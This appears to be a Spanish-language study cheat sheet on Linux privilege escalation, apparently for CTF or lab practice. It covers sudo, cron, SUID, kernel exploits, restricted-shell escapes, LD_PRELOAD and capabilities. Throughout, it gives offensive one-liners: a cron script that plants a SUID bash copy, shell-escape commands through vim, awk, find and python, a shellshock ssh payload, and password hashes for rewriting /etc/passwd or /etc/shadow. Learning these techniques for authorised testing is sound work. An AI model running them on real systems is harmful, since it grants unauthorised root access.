

### Metodología


**Antes de tirar linpeas o cualquier herramienta similar, ir primero a por las coasas más sencillas**

1º Revisar bien el entorno (si tenemos una web o un samba enumerarlo bien, por si hay algunas credenciales o usuarios que nos hayamos pasado por alto)

2º Una vez obtengamos la reverse shell mirar si podemos encontrar algún archivo de configuración con credenciales, claves ssh o podemos mirar algún tipo de servicio o proceso del que poder tirar

3º Mirar qué podemos ejecutar con sudo

```bash
sudo -l
```

4º Mirar las tareas programadas (cronjobs)

```bash
cat /etc/crontab
```

5º Miramos los binarios que tengan permisos SUID

```bash
find / -perm -4000 2>/dev/null #Mirarlo en GTFOBins
```

6º Miramos servicios

```bash
dpkg -l | grep <programa>
o
<programa> --v | -v
o
ps aux | grep "^root"
```

7º Miramos los procesos; podemos hacerlo con el programa de ***pspsy64*** **(debemos de tener una shell con ctrl+c porque si no podemos perder la shell actual)**

8º En caso de no encontrar nada con lo que seguir, tirar las herramientas 

---

### Herramientas para usar


- #### [linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20260129-01f247d5)

- #### [linenum](https://github.com/rebootuser/LinEnum)

- #### [lse](https://github.com/diego-treitos/linux-smart-enumeration)

- #### [pspy64](https://github.com/DominicBreuker/pspy)


---
### Binarios con permisos SUID


```bash
find / -perm -4000 2>/dev/null
```

Una vez tengamos el resultado los consultamos en GTFOBins para probar si podemos abusar de ellos

---
#### Creación de contraseñas para modificarlo en el /etc/passwd o el /etc/shadow

mkpasswd sha-512 contra --> /shadow

openssl passwd "contra" --> passwd

---
#### Cronjobs

listamos los archivos cron

/etc--> ls | grep cron

explotamos overwrite.sh

explotamos variables de entorno --> vamos a la primera ruta que tengamos permisos de modificacion y creamos un binario que se llame overwrite.sh copiando el binario de bash y renombrandolo por el nombre que queramos

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/path-exploit.sh

chmod +x /home/user/path-exploit.sh
```

[Consultar esta página para más info](https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/scheduled-tasks/cron-jobs.md)

---
#### Versión del kernel

```bash
cat /proc/version
o
uname -a
```

### Kernel exploit


![](../../img/Pasted%20image%2020260126174743.png)


https://github.com/firefart/dirtycow

descompilar .c --> gcc -pthread dirty.c -o dirty -lcrypt

---
#### Wildcards

Como `*` podemos explotarlos buscando en gtfobins, o podemos hacer uso de la [Guía explotación con wildcards](https://medium.com/@althubianymalek/linux-privilege-escalation-using-tar-wildcards-a-step-by-step-guide-55771aae063f "https://medium.com/@althubianymalek/linux-privilege-escalation-using-tar-wildcards-a-step-by-step-guide-55771aae063f")

---
#### Escapar de la shell

también consultar los binarios del usuario en gtfobins


**Enumeración**   
1) Primero debemos verificar si se pueden ejecutar comandos como cd/ls/echo, etc.  
2) Debemos verificar si podemos usar operadores como >, >>, <, |.  
3) Necesitamos verificar si están disponibles lenguajes de programación disponibles como perl, ruby, python, etc.  
4) Qué comandos podemos ejecutar como root (sudo -l).  
5) Comprobar si hay archivos o comandos con SUID.  
6) Hay que verificar en qué shell estamos: echo $SHELL (normalmente en rbash)  
7) Verificar las variables de entorno: ejecutar env o printenv


**Técnicas de explotación normales**  
1) si "/" está permitido se puede ejecutar /bin/sh o /bin/bash.  
2) si podemos ejecutar el comando cp podemos copiar /bin/sh o /bin/bash en el directorio.  
3) ftp > !/bin/sh o !/bin/bash  
4) gdb > !/bin/sh o !/bin/bash  
5) more/man/less > !/bin/sh o !/bin/bash  
6) vim > !/bin/sh o !/bin/bash  
7) rvim > :python import os; os.system("/bin/bash )  
8) scp > scp -S /path/yourscript x y:  
9) awk > awk 'BEGIN {system("/bin/sh o /bin/bash")}'  
10) find > find / -name test -exec /bin/sh o /bin/bash \;


**Técnicas de lenguajes de programación**  
1) except > except spawn sh then sh.  
2) python > python -c 'import os; os.system("/bin/sh")'  
3) php > php -a then exec("sh -i");  
4) perl > perl -e 'exec "/bin/sh";'  
5) lua > os.execute('/bin/sh').  
6) ruby > exec "/bin/sh"


**Técnicas avanzadas:**  
1) ssh > ssh username@IP -t "/bin/sh" or "/bin/bash"  
2) ssh2 > ssh username@IP -t "bash --noprofile"  
3) ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)  
4) ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh"127.0.0.1 (SUID)  
5) git > git help status > luego puedes ejecutar !/bin/bash  
6) pico > pico -s "/bin/bash" luego puedes escribir /bin/bash y pulsar CTRL + T  
7) zip > zip /tmp/test.zip /tmp/test -T --unzip -command="sh -c /bin/bash"  
8) tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint -action=exec=/bin/bash

---
#### Buscar archivos vpn


find `*ovpn` 


### LD_PRELOAD

Compila librerías y las ejecuta


1º Compilamos el binario

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Se ejecuta con

```bash
sudo LD_PRELOAD=./pe.so<COMANDO>
```

Lo mismo con LD_LIBRARY_PATH

![](../../img/Pasted%20image%2020260126171143.png)



### Binario Apache


Está en gtfobins

```bash
apache2 -f /etc/passwd
```

En algunas versiones de apache o software podemos abusar para leer archivos

$IP/?{} --> si da error nos puede devolver la versión
![](../../img/Pasted%20image%2020260128181042.png)

### SSH

![](../../img/Pasted%20image%2020260126174544.png)



### Exploit de servicios


![](../../img/Pasted%20image%2020260126175131.png)



### Jenkins


Sirve para automatizar ejecutando código


### Capabilities


![](../../img/Pasted%20image%2020260130173205.png)



![](../../img/Pasted%20image%2020260130173721.png)


![](../../img/Pasted%20image%2020260130173904.png)